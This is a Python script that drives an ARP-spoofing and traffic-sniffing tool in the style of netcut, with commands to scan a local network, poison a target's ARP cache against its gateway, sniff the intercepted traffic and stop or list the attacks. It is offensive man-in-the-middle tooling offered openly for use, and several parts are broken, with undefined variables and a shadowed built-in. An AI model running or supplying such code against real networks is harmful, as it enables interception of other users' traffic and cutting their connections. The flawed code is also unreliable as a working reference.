import asyncio, websockets, json, time, threading
import netcututils as nc
from scapy.all import *


def spoof(target_ip, gateway_ip):
    t = threading.currentThread()
    packet = nc.craft_arp_spoof(target_ip, gateway_ip)

    while getattr(t, "do_run", True):
        send(packet, verbose = False)
        
    time.sleep(1) #Optionnal

    # Reset the network back to its initial state (this is basically a correct ARP packet from a gateway to a target)
    send(ARP(op = 2, psrc = gateway_ip, hwsrc = getmacbyip(gateway_ip), pdst = target_ip, hwdst = getmacbyip(target_ip)))

def sniff(target_ip, gateway_ip):
    t = threading.currentThread()
    nc.sniffing(target_ip, gateway_ip)


while True:
    input = input().lower().split()
    if input[0] == "nmap_scan":

        if len(input) == 1:
            print(nc.nmap_scan())
        elif len(input) > 1:
            print(nc.nmap_scan(input[1]))

    elif input[0] == "arp_scan":

        if len(input) == 1:
            print(nc.arp_scan())
        elif len(input) > 1:
            print(nc.arp_scan(input[1]))

    elif input[0] == "arp_spoof":

        if len(input) > 2 and spoofed.count(input[1]) < 1 :
            spoofed.append(input[1])
            t = threading.Thread(target=spoof, args=(input[1], input[2]))
            spoofingThread.insert(spoofed.index(input[1]), t)
            t.start()

        elif len(input) == 2 and spoofed.count(input[1]) < 1 :
            spoofed.append(input[1])
            t = threading.Thread(target=spoof, args=(input[1], defaultGateway))
            spoofingThread.insert(spoofed.index(input[1]), t)

            t.start()
        else:
            print("Error : number of argument supplied is not correct")



    elif input[0] == "sniff":
        if len(input) == 2:
            sniffed.append(input[1])
            t = threading.Thread(target=sniff, args=(input[1], defaultGateway))
            sniffingThread.insert(sniffed.index(input[1]), t)
            t.start()
        elif len(input) > 2:
            sniffed.append(input[1])
            t = threading.Thread(target=sniff, args=(input[1], input[2]))
            sniffingThread.insert(sniffed.index(input[1]), t)
            t.start()
        else:
            print("Error: number f argument supplied is not equal to 2")

    elif input[0] == "set_gateway":
        this.defaultGateway = input[1]   

    elif input[0] == "spoof_stop":
        t = spoofingThread[spoofed.index(input[1])]
        spoofed.remove(input[1])
        t.do_run = False
        t.join()

    elif input[0] == "sniff_stop":
        t = sniffingThread[sniffed.index(input[1])]
        sniffed.remove(input[1])
        t.do_run = False
        t.join()
    elif input[0] =="get_spoofed":
        print(spoofed)

    elif input[0] =="get_sniffed":
        print(sniffed)

    elif input[0] == "smart_sniff":
        if len(input) > 2 and not input[1] in spoofed and not input[1] in sniffed:
            spoofed.append(input[1])
            sniffed.append(input[1])
            nc.smart_sniff(input[1], input[2])

        elif len(input) == 2 and not input[1] in spoofed and not input[1] in sniffed:
            spoofed.append(input[1])
            sniffed.append(input[1])
            nc.smart_sniff(input[1], defaultGateway)

        else:
            print("Error number o argument supplied is not correct")


    elif input[0] == "quit":
        print("quitting")
        break;
    else:
        print("this command doesn't exist")
        
    del input